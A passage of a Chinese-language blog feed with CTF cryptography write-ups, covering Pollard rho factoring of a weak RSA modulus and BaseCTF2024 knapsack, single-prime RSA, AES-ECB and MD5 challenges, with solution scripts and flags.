class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p><p>因为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>≈</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">\phi(N)≈N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span></p><p>所以：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>N</mi><mn>2</mn></msup><mo>&lt;</mo><mn>10000</mn><mo>∗</mo><mi>p</mi><mo>∗</mo><mi>q</mi><mo>∗</mo><msup><mi>k</mi><mn>2</mn></msup><mspace linebreak="newline"></mspace><mi>N</mi><mo>&lt;</mo><mn>10000</mn><mo>∗</mo><msup><mi>k</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">N^2&lt;10000*p*q*k^2\\N&lt;10000*k^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9032079999999999em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p><p>可以估计k很大，那么根据前面的推导<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi><mo>∗</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">\phi(N)=L*k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>就说明了p-1和q-1有一个较大的因子</p><p>然后xenny师傅说还是可以用PollardRho，我还是不理解，所以是p-1和q-1有一个较大的因子就可以用这个方法咯？</p><p>跟上题exp完全一样</p><h2 id="exp-25"><a class="markdownIt-Anchor" href="#exp-25"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>N=<span class="hljs-number">1108103848370322618250236235096737547381026108763302516499816051432801216813681568375319595638932562835292256776016949573972732881586209527824393027428125964599378845347154409633878436868422905300799413838645686430352484534761305185938956589612889463246508935994301443576781452904666072122465831585156151</span><br>e=<span class="hljs-number">65537</span><br>c = <span class="hljs-number">254705401581808316199469430068831357413481187288921393400711004895837418302514065107811330660948313420965140464021505716810909691650540609799307500282957438243553742714371028405100267860418626513481187170770328765524251710154676478766892336610743824131087888798846367363259860051983889314134196889300426</span><br><br>f = <span class="hljs-keyword">lambda</span> x,n: (<span class="hljs-built_in">pow</span>(x, n - <span class="hljs-number">1</span>, n) + <span class="hljs-number">3</span>) % n<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">phllard_rho</span>(<span class="hljs-params">n</span>):<br>    i = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        a = getRandomRange(<span class="hljs-number">2</span>, n)<br>        b = f(a, n)<br>        j = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            p = GCD(<span class="hljs-built_in">abs</span>(a - b), n)<br>            <span class="hljs-keyword">if</span> p == n:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">elif</span> p &gt; <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> (p, n // p)<br>            <span class="hljs-keyword">else</span>:<br>                a = f(a, n)<br>                b = f(f(b, n), n)<br>            j += <span class="hljs-number">1</span><br>        i += <span class="hljs-number">1</span><br>p,q=phllard_rho(N)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),N))))<br><span class="hljs-comment">#b&quot;TSGCTF&#123;Roll_Safe:_You_c4n&#x27;t_be_exploited_1f_you_are_a_minimali5t_enough_and_y0u_don&#x27;t_have_any_s3crets_in_your_mind&#125;&quot;</span><br><span class="hljs-comment">#NSSCTF&#123;Roll_Safe:_You_c4n&#x27;t_be_exploited_1f_you_are_a_minimali5t_enough_and_y0u_don&#x27;t_have_any_s3crets_in_your_mind&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>RSA</tag>
      
      <tag>Xenny的RSA题单</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BaseCTF2024-Crypto-naby</title>
    <link href="/2024/12/05/basectf2024/"/>
    <url>/2024/12/05/basectf2024/</url>
    
    <content type="html"><![CDATA[<blockquote><p>官方wp:<a href="https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh">https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh</a></p><p>复现平台: <a href="https://gz.imxbt.cn/games/13">https://gz.imxbt.cn/games/13</a></p></blockquote><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="week1"><a class="markdownIt-Anchor" href="#week1"></a> week1</h2><h3 id="babypack"><a class="markdownIt-Anchor" href="#babypack"></a> babypack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span><br>m=bytes_to_long(flag)<br>bin_m=<span class="hljs-built_in">bin</span>(m)[<span class="hljs-number">2</span>:]<br>length=<span class="hljs-built_in">len</span>(bin_m)<br><br>a=[<span class="hljs-number">1</span>]<br><span class="hljs-built_in">sum</span>=<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length-<span class="hljs-number">1</span>):<br>    temp=random.randint(<span class="hljs-number">2</span>*<span class="hljs-built_in">sum</span>+<span class="hljs-number">1</span>,<span class="hljs-number">4</span>*<span class="hljs-built_in">sum</span>)<br>    <span class="hljs-built_in">sum</span>=<span class="hljs-built_in">sum</span>+temp<br>    a.append(temp)<br><br>a=a[::-<span class="hljs-number">1</span>]<br>c=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>    <span class="hljs-keyword">if</span> bin_m[i]==<span class="hljs-string">&#x27;1&#x27;</span>:<br>        c=c+a[i]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a=&quot;</span>,a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c=&quot;</span>,c)<br></code></pre></td></tr></table></figure><p>简单的超递增序列（不懂的可以简单了解一下背包密码）</p><p>从尾开始遍历列表a，大于c就为0，小于等于c就为1，并且c要减去这个值</p><p>(数据太多我就不贴了)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#BaseCTF&#123;2c4b0c15-3bee-4e4a-be6e-0f21e44bd4c9&#125;</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>a=<br>c=<span class="hljs-number">2488656295807929935404316556194747314175977860755594014838879551525915558042003735363919054632036359039039831854134957725034750353847782168033537523854288427613513938991943920607437000388885418821419115067060003426834</span><br>bin_m=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> c&gt;=i:<br>        bin_m+=<span class="hljs-string">&quot;1&quot;</span><br>        c=c-i<br>    <span class="hljs-keyword">else</span>:<br>        bin_m+=<span class="hljs-string">&quot;0&quot;</span><br>m=<span class="hljs-built_in">int</span>(bin_m,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h3 id="babyrsa"><a class="markdownIt-Anchor" href="#babyrsa"></a> babyrsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span><br>m=bytes_to_long(flag)<br><br>n=getPrime(<span class="hljs-number">1024</span>)<br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">n = 104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>单素数RSA</p><blockquote><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>表示从1到n之间，有多少个数与n互素。</p><p>计算方法：排除掉不与n互素的数。</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>p</mi><mi>q</mi><mo stretchy="false">)</mo><mo>=</mo><mi>p</mi><mi>q</mi><mo>−</mo><mi>p</mi><mo>−</mo><mi>q</mi><mo>+</mo><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(pq)=pq-p-q+1 = (p-1)(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p>这题n已经是素数了，1到n-1都与n互素，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\phi(n)=n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p></blockquote><p>求到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">ϕ</span></span></span></span>之后就正常做就行</p><p>（理解RSA最重要的一点是搞懂e*d=1 mod(φ(n)），要理解为什么这里为什么是取φ(n)）</p><p>（很难绷，为什么那么多人问我n怎么分解，n=getPrime(1024)已经是素数了，不需要分解了。）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832</span><br><br>phin=n-<span class="hljs-number">1</span><br>d=gmpy2.invert(e,phin)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b&#x27;BaseCTF&#123;7d7c90ae-1127-4170-9e0d-d796efcd305b&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="hellpcrypto"><a class="markdownIt-Anchor" href="#hellpcrypto"></a> hellpCrypto</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">import</span> random<br><br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span><br><br>key=random.randbytes(<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(bytes_to_long(key))<br><br>my_aes=AES.new(key=key,mode=AES.MODE_ECB)<br><span class="hljs-built_in">print</span>(my_aes.encrypt(pad(flag,AES.block_size)))<br><br><span class="hljs-comment"># key1 = 208797759953288399620324890930572736628</span><br><span class="hljs-comment"># c = b&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;</span><br></code></pre></td></tr></table></figure><p>直接AES解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br>key1 = <span class="hljs-number">208797759953288399620324890930572736628</span><br>c = <span class="hljs-string">b&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;</span><br>my_aes1=AES.new(key=long_to_bytes(key1),mode=AES.MODE_ECB)<br><span class="hljs-built_in">print</span>(my_aes1.decrypt(c))<br><br><span class="hljs-comment">#b&#x27;BaseCTF&#123;b80bf679-1869-4fde-b3f9-d51b872d31fb&#125;\x03\x03\x03&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="你会算md5吗"><a class="markdownIt-Anchor" href="#你会算md5吗"></a> 你会算md5吗</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>flag=<span class="hljs-string">&#x27;BaseCTF&#123;&#125;&#x27;</span><br><br>output=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    my_md5=hashlib.md5()<br>    my_md5.update(i.encode())<br>    output.append(my_md5.hexdigest())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;output =&quot;</span>,output)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">output = [&#x27;9d5ed678fe57bcca610140957afab571&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;03c7c0ace395d80182db07ae2c30f034&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;0d61f8370cad1d412f80b84d143e1257&#x27;, &#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;, &#x27;800618943025315f869e4e1f09471012&#x27;, &#x27;f95b70fdc3088560732a5ac135644506&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, 